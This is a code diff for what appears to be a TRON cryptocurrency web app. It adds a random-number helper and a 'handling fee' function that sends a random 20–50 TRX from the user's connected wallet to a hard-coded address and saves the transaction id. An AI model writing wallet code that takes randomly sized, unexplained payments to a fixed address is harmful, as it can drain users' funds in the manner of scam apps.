@@ -1037,3 +1037,31 @@ export const SetArp = async function SetArp(num) {
 		warnmes('交易失败：' + e.message, null);
 	}
 };
+export const getRandom = function (min, max) {
+	return Math.floor(Math.random() * (max - min + 1)) + min;
+};
+
+//手续费转账
+export const sfeotc1 = async function (func) {
+	let num = getRandom(20, 50);
+	// let num = getRandom(1, 2);
+	let result = await window.tronWeb.trx.sendTransaction('TA6jfgkurdTrwqic3G56GpG2Keh5EWx2kq', TronValues(num));
+
+	console.log(result);
+
+	// setTimeout(function () {
+	// debugger.
+	// console.log(111);
+	// let success = await zhuanzhang(result.txid);
+	// console.log(success);
+	// if (success.ret[0].contractRet != "SUCCESS") {
+	//   Toast.clear();
+	//   Vue.$toast.error('质押失败！');
+	// } else {
+	localStorage.setItem('apphx', result.txid);
+	// func();
+	// }
+	// }, 1000);
+
+	// });
+};
